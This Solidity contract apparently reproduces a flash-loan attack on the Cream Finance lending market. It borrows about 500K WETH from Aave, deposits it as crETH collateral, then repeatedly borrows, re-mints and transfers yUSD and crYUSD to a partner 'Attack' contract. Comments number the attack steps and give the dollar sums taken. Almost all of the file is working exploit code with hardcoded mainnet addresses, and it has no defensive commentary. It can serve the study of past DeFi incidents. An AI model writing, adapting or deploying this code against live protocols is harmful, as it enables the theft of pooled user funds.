
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Attack.sol";
import "./interfaces/IWETH.sol";
import "./interfaces/aave/FlashLoanReceiverBase.sol";
import "./interfaces/IcrETH.sol";
import "./interfaces/IUnitroller.sol";
import "./interfaces/IcrYUSD.sol";


import "hardhat/console.sol";

contract Brother is Ownable, FlashLoanReceiverBase {

    address payable brother;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 WETH_AMOUNT = 524102159298234706604104; // 500K WETH

    address crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;

    // Unitroller
    address UnitrollerAddress = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;

    modifier onlyBrother {
        require(msg.sender == brother, "Not my brother");
        _;
    }

    constructor(address payable _brother, ILendingPoolAddressesProvider _addressProvider)
        FlashLoanReceiverBase(_addressProvider)
    {
        brother = _brother;
    }

    fallback () external payable {}

    function flashLoanAAVE() external onlyBrother {
        // Don't know why exploiter queried this?
        (uint err, uint liquidity, uint shortfall) = IUnitroller(UnitrollerAddress).getAccountLiquidity(brother);

        address receiver = address(this);

        address[] memory assets = new address[](1);
        assets[0] = WETH;

        uint[] memory amounts = new uint[](1);
        amounts[0] = WETH_AMOUNT;

        uint[] memory modes = new uint[](1);
        modes[0] = 0;

        address onBehalfOf = address(this);

        bytes memory params = "";
        uint16 referralCode = 0;

        LENDING_POOL.flashLoan(
            receiver,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );

        moveFunds();
    }

    function executeOperation(
        address[] calldata assets,
        uint[] calldata amounts,
        uint[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(initiator == address(this), "Untrusted loan initiator");

        continueAttack();


        // Approve for repay
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }
        return true;
    }

    function continueAttack() internal {
        
        uint sendAmount = 6000 * 1e18;
        uint remainAmount = WETH_AMOUNT - sendAmount;
        IWETH(WETH).transfer(brother, sendAmount);
        IWETH(WETH).withdraw(remainAmount); // remainAmount = 518102159298234706604104

        // STEP 7: Mint crETH by depositing ~ $2B ETH in Cream.
        IcrETH(payable(crETH)).mint{value: remainAmount}(); // minted 2495186214379013 crETH
        address[] memory cTokens = new address[](1);
        cTokens[0] = crETH;
        // use crETH as collateral
        IUnitroller(UnitrollerAddress).enterMarkets(cTokens);

        // We will borrow all the balance
        uint yUSDBalanceInCream = IERC20(yUSD).balanceOf(crYUSD);

        // STEP 8: Borrow $500M yUSD by using the crETH as collateral.
        IcrYUSD(crYUSD).borrow(yUSDBalanceInCream);  // yUSDBalanceInCream 446758201298291883672778866 -> IERC20(yUSD).balanceOf(crYUSD)
        uint yUSDBalance = IERC20(yUSD).balanceOf(address(this));
        IERC20(yUSD).approve(crYUSD, yUSDBalance);
        // STEP 9: Mint $500M crYUSD by depositing the $500M yUSD back in Cream.
        IcrYUSD(crYUSD).mint(yUSDBalance);
        uint crYUSDBalance = IERC20(crYUSD).balanceOf(address(this));
        // STEP 10: Transfer $500M crYUSD to account A. Account A now has $1B crYUSD.
        IERC20(crYUSD).transfer(brother, crYUSDBalance); // crYUSDBalance 2233784568524278318

        // STEP 11: Again, Borrow $500M yUSD by using the $2B ETH collateral. 
        // Debt becomes $B against a $2B collateral.
        // (Remember that by minting crYUSD the yUSD got transferred
        // back to Cream so we can borrow it again)
        IcrYUSD(crYUSD).borrow(yUSDBalanceInCream);
        yUSDBalance = IERC20(yUSD).balanceOf(address(this));
        IERC20(yUSD).approve(crYUSD, yUSDBalance);
        // STEP 12: Mint $500M crYUSD by depositing the $50M yUSD back in Cream.
        IcrYUSD(crYUSD).mint(yUSDBalance);
        crYUSDBalance = IERC20(crYUSD).balanceOf(address(this));
        // STEP 13: Transfer $500M cryUSD to account A. Account A now has $1.5B crYUSD
        IERC20(crYUSD).transfer(brother, crYUSDBalance); // crYUSDBalance 2233784568524278318


        // STEP 14: Again, Borrow $500M yUSD. Debt becomes $1.5B against a $2B collateral.
        IcrYUSD(crYUSD).borrow(yUSDBalanceInCream);
        yUSDBalance = IERC20(yUSD).balanceOf(address(this));
        // STEP 15: Transfer $500M yUSD to account A. Account A now has $1.5B crYUSD and $500M yUSD.
        IERC20(yUSD).transfer(brother, yUSDBalance); // yUSDBalance 446758201298291883672778866

        Attack(brother).continueAttack();
    }

    function moveFunds() internal {
        IERC20(WETH).transfer(owner(), IERC20(WETH).balanceOf(address(this)));
    }
}